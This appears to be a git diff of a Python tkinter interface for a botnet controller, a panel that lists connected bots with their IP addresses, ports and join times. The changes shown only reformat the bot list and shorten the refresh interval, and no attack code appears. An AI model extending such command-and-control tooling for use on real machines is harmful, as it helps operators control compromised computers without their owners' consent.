@@ -1,6 +1,7 @@
 import tkinter as tk
 import time
 import socket
+from datetime import datetime
 
 master_client = __import__('master-client')
 
@@ -43,7 +44,7 @@ def connect():
         global receive
         receive = master_client.Receive(client.sock, client.type, client)
         global botlist
-        botlist = client.botlist
+        botlist = master_client.botList
 
 
     print(ip)
@@ -137,7 +138,7 @@ for i in range(2):
 
 scroll = tk.Scrollbar(master=frame_b)
 scroll.pack(side=tk.RIGHT, fill=tk.Y)
-canvas = tk.Canvas(master=frame_b, width=100)
+canvas = tk.Canvas(master=frame_b, width=150)
 bots = tk.Frame(master=canvas)
 scroll.config(command=canvas.yview)
 
@@ -165,11 +166,23 @@ def handle_bots(*args):
     list = bots.pack_slaves()
     for i in list:
         i.destroy()
-    for i in botlist:
-        j = i.split(";")
-        label1 = tk.Label(master=bots, relief=tk.RAISED, borderwidth=1, fg="green",
-                          text=f"BOT {i}\nIP: {j[1]}\nPort: {j[2]}\nJoined: {j[0]}")
-        label1.pack(padx=5, pady=5)
+    if len(botlist) != 0:
+        form1 = botlist.split(", ")
+        botnum = 1
+        for j in form1:
+            print(j)
+            form2 = j.split(";")
+            form4 = []
+            for k in form2:
+                form3 = k.replace(",", "")
+                print(form3)
+                form4.append(form3)
+            tformat = int(form4[0])
+            tformat = datetime.utcfromtimestamp(tformat).strftime('%Y-%m-%d %H:%M:%S')
+            label1 = tk.Label(master=bots, relief=tk.RAISED, borderwidth=1, fg="green",
+            text=f"BOT {botnum} \nIP: {form4[1]}\nPort: {form4[2]}\nJoined: {tformat}")
+            label1.pack(padx=5, pady=5)
+            botnum += 1
 
 
 botupdate = tk.IntVar()
@@ -207,8 +220,8 @@ while running == True:
             lighton = True
         #oldlist = botlist
         send.listbot()
-        time.sleep(10)
-        botlist = client.botlist
+        time.sleep(3)
+        botlist = master_client.botList
         print(botlist)
         #time.sleep(10)
         #if botlist != oldlist:
